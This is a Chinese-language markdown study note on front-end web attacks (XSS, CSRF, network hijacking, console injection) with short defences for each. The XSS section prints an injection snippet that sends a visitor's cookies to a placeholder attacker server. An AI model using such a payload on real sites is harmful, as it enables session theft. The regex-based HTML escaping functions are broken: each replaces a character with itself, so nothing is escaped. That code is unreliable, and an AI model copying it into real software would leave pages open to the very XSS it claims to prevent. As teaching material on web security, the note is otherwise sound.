<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*
# 网络安全

## 前端攻击方式

- [XSS (Cross Site Scripting) 跨站脚本攻击](#xss-cross-site-scripting-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB)
- [CSRF (Cross-site request forgery) 跨站请求伪造](#csrf-cross-site-request-forgery-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
- [网络劫持](#%E7%BD%91%E7%BB%9C%E5%8A%AB%E6%8C%81)
- [控制台注入代码](#%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## XSS (Cross Site Scripting) 跨站脚本攻击

XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。其实在web前端方面，可以简单的理解为一种javascript代码注入。

场景：

在某些论坛的评论中，插入了 ajax 代码，在其他人访问该页面时，可以获取他人在当前域名下的 cookie 并发送到的服务器上。

注入代码：
```js
$.ajax({
    url: '自己的服务器',
    dataType: 'jsonp',
    data: {'盗取的用户cookie': document.cookie}
});
```

防范措施：  
1、将前端输出数据都进行转义。  
2、使用 cookie 的 HttpOnly 属性保护好 cookie。  

两张转义和反转义的方式：

```js
var HtmlUtil = {
		/*1.用浏览器内部转换器实现html转码*/
  htmlEncode: function(html) {
    //1.首先动态创建一个容器标签元素，如DIV  
    var temp = document.createElement("div");
    //2.然后将要转换的字符串设置为这个元素的innerText(ie支持)或者textContent(火狐，google支持)  
    (temp.textContent != undefined) ? (temp.textContent = html) : (temp.innerText = html);
    //3.最后返回这个元素的innerHTML，即得到经过HTML编码转换的字符串了  
    var output = temp.innerHTML;
    temp = null;
    return output;
  },
  /*2.用浏览器内部转换器实现html解码*/
  htmlDecode: function(text) {
    //1.首先动态创建一个容器标签元素，如DIV  
    var temp = document.createElement("div");
    //2.然后将要转换的字符串设置为这个元素的innerHTML(ie，火狐，google都支持)  
    temp.innerHTML = text;
    //3.最后返回这个元素的innerText(ie支持)或者textContent(火狐，google支持)，即得到经过HTML解码的字符串了。  
    var output = temp.innerText || temp.textContent;
    temp = null;
    return output;
  },
  /*3.用正则表达式实现html转码*/
  htmlEncodeByRegExp: function(str) {
    var s = "";
    if (str.length == 0) return "";
    s = str.replace(/&/g, "&");
    s = s.replace(/</g, "<");
    s = s.replace(/>/g, ">");
    s = s.replace(/ /g, " ");
    s = s.replace(/\'/g, "'");
    s = s.replace(/\"/g, '"');
    return s;
  },
  /*4.用正则表达式实现html解码*/
  htmlDecodeByRegExp: function(str) {
    var s = "";
    if (str.length == 0) return "";
    s = str.replace(/&/g, "&");
    s = s.replace(/</g, "<");
    s = s.replace(/>/g, ">");
    s = s.replace(/ /g, " ");
    s = s.replace(/'/g, "\'");
    s = s.replace(/"/g, "\"");
    return s;
  }
};
```

## CSRF (Cross-site request forgery) 跨站请求伪造

CSRF 是一种对网站的恶意利用。其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上

场景：

某些商场的提交操作使用 get 方式，或者 post 请求无需验证码。

防范措施：
1、避免数据操作类的行为使用 get 请求。
2、post 请求添加验证码（token）。

## 网络劫持

很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。

## 控制台注入代码

黑客会诱骗用户去往控制台里面粘贴代码，获取用户的信息。

See Also

[聊一聊WEB前端安全那些事儿](https://segmentfault.com/a/1190000006672214)  
[JS对HTML字符的转义和反转义](https://blog.csdn.net/u013026207/article/details/53994032)  
